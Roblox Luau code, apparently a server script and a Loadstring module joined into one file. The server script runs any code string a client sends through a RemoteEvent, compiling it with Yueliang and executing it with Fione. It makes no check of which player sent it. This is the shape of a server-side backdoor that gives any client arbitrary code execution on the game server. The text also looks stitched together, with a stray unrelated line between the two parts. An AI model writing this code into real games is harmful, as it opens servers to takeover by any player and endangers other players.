-- Attempt to find the RemoteEvent in the parent of the current script
local remoteEvent = script.Parent:FindFirstChild("RemoteEvent")

-- Check if the RemoteEvent exists
if not remoteEvent then
	return  -- Exit the script early if RemoteEvent is not found
end

-- Set up an event listener for the RemoteEvent
remoteEvent.OnServerEvent:Connect(function(player, data)
	-- `player` is intentionally unused
	-- Handle the event from the client here

	-- Check if the Loadstring module exists
	local loadstringModule = script:FindFirstChild("Loadstring")
	if not loadstringModule then
		return  -- Exit if Loadstring module is not found
	end

	-- Require the Loadstring module
	local loadstringFunc = require(loadstringModule)

	-- Check if loadstringFunc is a function before calling it
	if type(loadstringFunc) == "function" then
		-- Execute the function returned by loadstringFunc
		local success, errorMsg = pcall(function()
			local func = loadstringFunc(data)  -- Call loadstringFunc with data
			if func then
				func()  -- Call the function created from the loaded string
			end
		end)

		-- Optional: log errorMsg to console or datastore if needed
		if not success then
			print("Error executing loadstring:", errorMsg)
		end
	end
end)

local function safeRequire(module)
	local success, result = pcall(require, module)
	if not success then
		warn("Failed to require module:", module.Name, result)
	end
	return result
end

local compile = safeRequire(script:WaitForChild("Yueliang"))
local createExecutable = safeRequire(script:WaitForChild("Fione"))

local currentScript = script

-- You can now use currentScript instead of script
currentScript.Parent:FindFirstChild("SomeChild")

return function(source, env)
	local executable
	env = env or getfenv()  -- Use the provided environment or the current one

	-- Get the script's name or use "unnamed" if not available
	local name = (env.script and env.script:GetFullName()) or "unnamed"

	-- Try to compile the source code and create an executable
	local success, errorMessage = pcall(function()
		local compiledBytecode = compile(source, name)  -- Compile the source code
		executable = createExecutable(compiledBytecode, env)  -- Create the executable
	end)

	if success then
		return executable  -- Return the executable if successful
	else
		return nil, errorMessage  -- Return nil and the error message
	end
end
